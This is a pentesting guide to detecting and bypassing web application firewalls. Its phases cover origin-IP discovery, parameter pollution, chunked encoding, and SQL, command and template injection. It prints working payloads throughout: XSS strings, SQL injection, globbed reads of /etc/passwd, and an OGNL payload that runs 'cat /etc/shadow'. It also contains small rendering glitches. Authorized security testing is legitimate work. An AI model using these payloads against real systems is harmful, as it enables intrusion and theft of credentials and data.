# Complete WAF Bypass Methodology: A Practical Guide

This guide provides a structured methodology for testing and bypassing Web Application Firewalls (WAFs) during authorized penetration testing engagements. All techniques described are based on real-world vulnerabilities and should only be used on systems you have explicit permission to test.

---

## Understanding How WAFs Work

Before attempting to bypass a WAF, you must understand what you are up against. Modern WAFs use three primary detection methodologies :

### Signature-Based Detection
These systems maintain databases of known attack patterns. When an attack matches a known signature, the WAF blocks it. The main advantage is low false positives, but they struggle with novel attack vectors and require constant updates.

### Machine Learning-Based Detection
These systems analyze traffic patterns and user behavior to identify anomalous requests. They can potentially detect zero-day attacks but may have higher false positive rates, especially on low-traffic applications.

### Behavioral Fingerprinting
Advanced WAFs like Cloudflare analyze not just the payload but also the transport layer—TCP fingerprints, TLS handshake patterns, HTTP/2 frame structures, and request timing . This is why simply encoding a payload often fails against sophisticated WAFs.

---

## Phase 1: WAF Detection and Fingerprinting

Before attempting any bypass, you must identify what WAF you are dealing with.

### Automated Detection

The most efficient approach is using dedicated detection tools:

**Using wafw00f (Quick Detection)**
```bash
wafw00f https://example.com
```
This tool sends both normal and malicious requests, analyzing responses to identify the WAF vendor.

**Using WAFtester (Comprehensive Detection)**
```bash
npx -y @waftester/cli vendor -u https://target.com
```
This provides vendor identification with confidence scores and evidence, covering 198 vendor signatures including Cloudflare, AWS WAF, Akamai, Imperva, and more .

**Using EvilWAF for Deep Analysis**
```bash
python3 evilwaf.py -t https://target.com
```
This tool performs transparent MITM proxy analysis with automatic WAF vendor detection before attempting bypasses .

### Manual Detection Techniques

When automated tools are blocked or you need to confirm findings:

```bash
# Check DNS history for origin IP leaks
dig +short target.com
curl -s https://ipinfo.io/<ip> | jq -r '.org'

# Check for WAF-specific response headers
curl -I https://target.com | grep -i "cf-ray\|x-sucuri-id\|x-akamai\|x-iinfo"
```

**Cloudflare indicators**: `cf-ray` header, `__cfduid` cookie, 1020 error page 

**AWS WAF indicators**: Specific `x-amzn-RequestId` patterns and error responses

**Akamai indicators**: `X-Akamai-Transformed` header patterns

---

## Phase 2: The Most Critical Bypass — Origin IP Discovery

The most effective WAF bypass does not involve evading the WAF at all. Instead, you completely circumvent it by directly attacking the origin server.

### Why This Works

Many organizations configure a WAF or CDN to proxy traffic but fail to properly restrict access to the origin IP address. If you can find the real server IP, you can send requests directly to it, bypassing all WAF protections entirely.

### Real-World Case: Akamai WAF Bypass via DNS Leak

A critical vulnerability report from HITCON ZeroDay (ZD-2026-00539) demonstrated a complete bypass of Akamai WAF protection. The ezorder online ordering system at `ezorder.8way.com.tw` was protected by Akamai WAF, but the origin server's real IP address was leaked through the `mail` subdomain's DNS records. By obtaining the exposed origin IP, an attacker could:

1. Forge the `Host` header to match the protected domain
2. Bypass the WAF entirely by connecting directly to the origin server
3. Access the backend Microsoft Exchange OWA login interface, which should have been protected

### Tools and Techniques for Origin Discovery

**Using EvilWAF Auto-Hunt Mode**
```bash
python3 evilwaf.py -t https://target.com --auto-hunt
```
This runs 10 parallel scanners including DNS history, SSL certificate analysis, subdomain enumeration, cloud leak detection, and GitHub search .

**Using Cloudflair**
```bash
python3 cloudflair.py domain.com
```
This tool discovers origin IPs behind Cloudflare by analyzing SSL certificate data and scanning ranges.

**Using viewdns.info**
```
https://viewdns.info/iphistory/?domain=domain.com
```
Historical DNS records often reveal the origin IP from before the WAF was deployed.

**Subdomain Enumeration for Origin Candidates**
```bash
# Common subdomains that may bypass WAF
dev.domain.com
stage.domain.com
origin.domain.com
origin-sub.domain.com
ww1.domain.com
ww2.domain.com
www.domain.uk/jp/
mail.domain.com
direct.domain.com
```

### Manual Verification

Once you have a candidate IP:
```bash
# Test if the IP responds to the protected domain's Host header
curl -k -H "Host: protected.domain.com" https://[candidate-ip]/
```

If you get a valid response, you have likely found the origin server.

---

## Phase 3: Parameter Pollution Attacks

Parameter pollution exploits how different web frameworks handle duplicate HTTP parameters. This technique achieved a 70.6% bypass rate against 17 different WAF configurations in recent testing .

### Understanding Framework Behaviors

Different frameworks process multiple parameters with the same name differently:

| Framework | Input | Output Behavior |
|-----------|-------|-----------------|
| ASP.NET | `param=val1¶m=val2` | `param=val1,val2` (comma concatenation) |
| ASP Classic | `param=val1¶m=val2` | `param=val1,val2` |
| Golang | `param=val1¶m=val2` | `param=['val1','val2']` (array) |
| Python Zope | `param=val1¶m=val2` | `param=['val1','val2']` (array) |
| Node.js | `param=val1¶m=val2` | `param=val1,val2` (comma concatenation) |

### Real-World XSS Bypass for ASP.NET

In a real penetration test, an ASP.NET application behind a restrictive WAF had a vulnerability where user input was reflected inside a JavaScript string. The simple payload `'; alert(1); //` was blocked. The solution was parameter pollution .

**The Vulnerable Code Pattern:**
```javascript
userInput = 'INPUT_FROM_USER';
```

**The Bypass Payload Structure:**
```
/?q=1'&q=alert(1)&q='2
```

**What Happens:**
1. ASP.NET concatenates the values with commas: `1',alert(1),'2`
2. The resulting JavaScript is: `userInput = '1',alert(1),'2';`
3. The comma operator evaluates each expression, executing `alert(1)`

**Burp Suite Testing Methodology:**

1. Identify a parameter reflected in a JavaScript context
2. Test with simple pollution first:
   ```
   GET /search?q=test'&q=alert(1)&q='test
   ```
3. Check the response to see if the comma-concatenated values appear
4. Refine based on WAF behavior

### Testing Results Against Major WAFs

Testing with three payload variations against 17 WAF configurations showed :

**Payload 1 (Simple)** : `q=';alert(1),'`
- Blocked by most WAFs (17.6% success rate)

**Payload 2 (Pollution with Semicolon)** :
```
q=1'+1;let+asd=window&q=def='al'+'ert'+;asd[def](1&q=2);
```
- 52.9% success rate

**Payload 3 (Pollution with Line Breaks)** :
```
q=1'%0aasd=window&q=def="al"+"ert"&q=asd[def](1)+'
```
- 70.6% success rate

### How to Test in Burp Suite

1. **Configure Intruder**: Send the request to Intruder, position markers around parameter values
2. **Create payload positions** for multiple parameters with the same name
3. **Use Grep-Match** to identify reflection patterns in responses
4. **Analyze the concatenation behavior** before adding malicious code

---

## Phase 4: Chunked Transfer Encoding Bypass

The `Transfer-Encoding: chunked` header tells the server to accept data in pieces. By splitting a malicious payload across multiple chunks, you can evade signature detection .

### How It Works

Normal WAF inspection sees the complete payload in a single request. With chunked encoding, the WAF may:
- Only inspect the first chunk
- Fail to reassemble chunks properly before inspection
- Skip inspection entirely based on configuration

### Burp Suite Plugin Method

Use the Chunked Coding Converter extension:
1. Install from BApp Store or GitHub (`c0ny1/chunked-coding-converter`)
2. Right-click on any request → "Chunked coding converter"
3. Select "Convert to chunked"
4. The extension splits the payload across multiple chunks
5. Send the request and observe if the WAF blocks it

### Manual Chunked Encoding

A chunked request looks like this:
```
POST /search HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5
alert
5
(1)
0

```

Each chunk starts with the chunk size in hex, followed by the data. The `0` chunk indicates the end.

### WAF Configuration Weakness

Some WAFs are configured to skip inspection for chunked requests . A custom rule like:
```
SecRule REQUEST_HEADERS:Transfer-Encoding "@contains chunked" "phase:1,id:4000101,nolog,pass,ctl:ruleEngine=off"
```
This rule disables the WAF entirely for chunked requests—a critical misconfiguration to test for.

---

## Phase 5: SQL Injection Bypass Techniques

### JSON in SQL Bypass (AWS WAF Vulnerability)

In December 2022, Claroty Team82 discovered a generic WAF bypass technique involving appending JSON syntax to SQL injection payloads. Major WAFs including AWS WAF failed to parse JSON within SQL contexts .

**The Bypass Technique:**
```sql
' OR JSON_EXTRACT('{"id": 14, "name": "Aztalan"}', '$.name') = 'Aztalan
```

**Why It Works:**
JSON in SQL has been supported by Microsoft SQL Server, MySQL, SQLite, and PostgreSQL for years. WAF signatures for SQL injection typically look for patterns like `OR 1=1`, not JSON functions. The JSON structure bypasses signature detection while remaining valid SQL.

**How to Test:**
```bash
# Test with Burp Suite Repeater
GET /page?id=1' OR JSON_EXTRACT('{"test":"value"}', '$.test') = 'value-- 
```

**Mitigation Status:** AWS WAF and other vendors patched this after disclosure, but the technique remains useful for testing custom rule implementations.

### Wildcard and Globbing for Command Injection

When command injection is possible but WAFs block specific commands, use globbing patterns :

**Standard command:**
```bash
cat /etc/passwd
```

**Globbing bypasses:**
```bash
# Question mark wildcard (each ? represents one character)
cat /e??/p????d

# Character class wildcard
cat /e[tv]c/p[aeiou]*d

# Variable injection
cat /e${FOO:-c}/pa${BAR:-sswd}

# Command obfuscation
wh$()oami
whoam$(echo+i)
who'a'mi
```

### Testing Methodology for SQL Injection

**Step 1: Identify injection point**
```
' 
"
`
' OR '1'='1
```

**Step 2: Test WAF boundaries with benign pollution**
```
GET /page?id=1'/*&id=*/or/*&id=*/1=1/*&id=*/--+-
```

**Step 3: If blocked, add encoding layers**
```
# Double URL encoding
%2527%2520OR%25201%253D1--

# Unicode encoding
%uff11%27%20OR%201%3D1--
```

**Step 4: Use time-based detection for blind injection**
```
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
```

---

## Phase 6: Server-Side Template Injection (SSTI) Bypass

SSTI attacks target template engines like Jinja2, Freemarker, and Twig. WAFs often struggle with SSTI because legitimate template syntax overlaps with attack syntax.

### Real-World Attack Campaign Example

In October 2025, attackers launched coordinated attacks from Mumbai infrastructure targeting Java application frameworks . Two specific attack patterns were observed:

**Struts 2 RCE (OGNL Injection)** :
The payload attempted to navigate the Struts ValueStack, clear security blacklists, and execute system commands:
```java
${(#arglist=['cat','/etc/shadow']).(#cmd=new freemarker.template.utility.Execute()).(#cmd.exec(#arglist))}
```

**Server-Side Template Injection (Jelly/Glide)** :
```xml
<g:evaluate>new String(new java.io.FileInputStream('../conf/glide.db.properties').getBytes())</g:evaluate>
```

### Automated SSTI Testing with Fenjing

Fenjing is an automated tool for Jinja2 SSTI WAF bypass :

```bash
# Install
pipx install fenjing

# Web UI mode (recommended for beginners)
fenjing webui

# Scan for parameters automatically
fenjing scan --url 'http://target.com/page'

# Manual parameter testing
fenjing crack --url 'http://target.com/page' --method GET --inputs name,id

# Extract blacklist from source code
fenjing crack-keywords -k app.py -c 'cat /etc/passwd'
```

Fenjing automatically bypasses:
- Quote and bracket restrictions
- Underscore blocking (`_` replaced with `(lipsum|escape|batch(22)|list|first|last)`)
- Digit blocking (0-9 via hexadecimal, arithmetic, or Unicode)
- Keyword filtering via string splitting and concatenation

---

## Phase 7: Advanced Tooling for Comprehensive Testing

### WAFtester: The Complete CLI Solution

WAFtester is currently the most comprehensive WAF testing tool, with 2,800+ payloads and 96 tamper scripts .

**Full Automated Assessment:**
```bash
npx -y @waftester/cli auto -u https://target.com --smart
```
This executes the complete lifecycle: endpoint discovery → WAF fingerprinting → optimal tamper selection → payload testing → report generation.

**Bypass Discovery:**
```bash
npx -y @waftester/cli bypass -u https://target.com --smart --tamper-auto
```
Output shows:
- Total payload variants tested
- Blocked vs. bypassed counts
- Top bypass chains (e.g., `charunicodeencode + space2morecomment`)

**Statistical Assessment with Metrics:**
```bash
npx -y @waftester/cli assess -u https://target.com -fp -o assessment.json
```
Outputs enterprise-grade metrics:
- Detection Rate (True Positive Rate)
- False Positive Rate
- Precision, Recall, F1 Score
- Matthews Correlation Coefficient (MCC)

**Multi-Protocol Support:**
```bash
# GraphQL APIs
waf-tester scan -u https://api.example.com/graphql -types graphql

# gRPC services
waf-tester scan -u grpc://service:50051 -types grpc

# WebSocket endpoints
waf-tester scan -u wss://api.example.com/socket -types websocket
```

### EvilWAF: Advanced MITM Proxy

EvilWAF operates at the transport layer, rotating TCP and TLS fingerprints to avoid behavioral detection .

**Basic Proxy Mode:**
```bash
python3 evilwaf.py -t https://target.com
```

**With Origin IP Hunting:**
```bash
python3 evilwaf.py -t https://target.com --auto-hunt
```

**With Tor IP Rotation:**
```bash
python3 evilwaf.py -t https://target.com --enable-tor
```

**With External Proxy Pool:**
```bash
python3 evilwaf.py -t https://target.com --proxy-pool proxies.txt
```

The tool automatically detects WAF vendor, rotates source ports per request, injects Cloudflare headers to test IP allowlist bypasses, and can route directly to origin IP once discovered.

---

## Phase 8: Comprehensive Testing Checklist

### Pre-Engagement

1. **Obtain written authorization** for all testing activities
2. **Document scope** (domains, IP ranges, excluded systems)
3. **Establish testing window** to avoid business disruption

### Discovery Phase

- [ ] Run `wafw00f` for initial detection
- [ ] Run `waf-tester vendor` for detailed fingerprinting
- [ ] Check DNS history for origin IP leaks
- [ ] Enumerate subdomains for WAF-exposed endpoints
- [ ] Analyze SSL certificates for origin IPs
- [ ] Check GitHub for exposed credentials or configuration

### Origin IP Bypass Attempts

- [ ] Run `evilwaf --auto-hunt` for comprehensive origin discovery
- [ ] Test candidate origin IPs with Host header forging
- [ ] Check if origin IP allows direct HTTPS access
- [ ] Test if origin IP responds to any domain's Host header

### Parameter Pollution Testing

- [ ] Identify framework (ASP.NET, Node.js, Golang, etc.)
- [ ] Test basic parameter concatenation behavior
- [ ] Build pollution payloads for the specific context
- [ ] Test with line breaks and semicolon variations
- [ ] Verify execution in target context

### Encoding and Obfuscation

- [ ] Single URL encoding
- [ ] Double URL encoding
- [ ] Unicode encoding (`\u0061\u006C\u0065\u0072\u0074`)
- [ ] HTML entity encoding (`&#x61;&#x6C;&#x65;&#x72;&#x74;`)
- [ ] Base64 with eval()
- [ ] Chunked transfer encoding
- [ ] Mixed case (`<ScRiPt>`)

### Protocol-Level Testing

- [ ] HTTP method switching (GET → POST → PUT → PATCH)
- [ ] Content-Type header manipulation
- [ ] Chunked encoding with `Transfer-Encoding: chunked`
- [ ] Large content-length to trigger bypass rules
- [ ] HTTP/2 vs HTTP/1.1 comparison

### Vendor-Specific Testing

- [ ] Cloudflare: Test `CF-Connecting-IP` header injection
- [ ] Akamai: Test `Pragma: akamai-x-get-true-cache-key`
- [ ] AWS WAF: Test JSON in SQL injection
- [ ] Azure WAF: Test escaped character handling (`test\\';alert(1)//`)
- [ ] Imperva: Test parameter pollution with null bytes

---

## Reporting and Documentation

When testing is complete, document findings including:

1. **WAF vendor and version identified**
2. **Configuration weaknesses discovered**
3. **Specific bypass techniques that succeeded**
4. **Payloads that worked and why**
5. **Steps to reproduce**
6. **Risk assessment and remediation recommendations**

### Example Finding Documentation

**Title**: WAF Bypass via Parameter Pollution in ASP.NET Application

**Description**: The ASP.NET application behind [WAF Vendor] concatenates multiple parameters with the same name using commas. Combined with a JavaScript injection point, this allows arbitrary JavaScript execution.

**Steps to Reproduce**:
1. Navigate to `/search?q=1'&q=alert(document.domain)&q='1`
2. Observe JavaScript execution in browser
3. WAF does not block because each individual parameter contains benign content

**Payload**:
```
/search?q=1'&q=alert(document.domain)&q='1
```

**Impact**: Cross-Site Scripting (XSS) allowing session hijacking and data theft

**Remediation**: Implement framework-specific parameter parsing in WAF rules or add application-level output encoding

---

## Important Legal and Ethical Considerations

All testing described in this document must be performed only on systems you own or have explicit written permission to test. Unauthorized WAF testing may violate:
- Computer Fraud and Abuse Act (CFAA) in the US
- Computer Misuse Act in the UK
- Similar laws in other jurisdictions

Always:
- Obtain written authorization before testing
- Define clear scope boundaries
- Report findings responsibly
- Do not exfiltrate or modify data
- Stop testing immediately if unexpected behavior occurs

---

## References and Further Resources

- [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF) - Curated list of WAF resources
- [WAF Community Bypasses](https://github.com/waf-bypass-maker/waf-community-bypasses)
- [WAF-Bypass.com](https://waf-bypass.com) - Online reference
- [PortSwigger Research](https://portswigger.net/research) - WAF bypass research
- [Claroty WAF Bypass Blog](https://claroty.com/team82/research) - JSON in SQL injection details
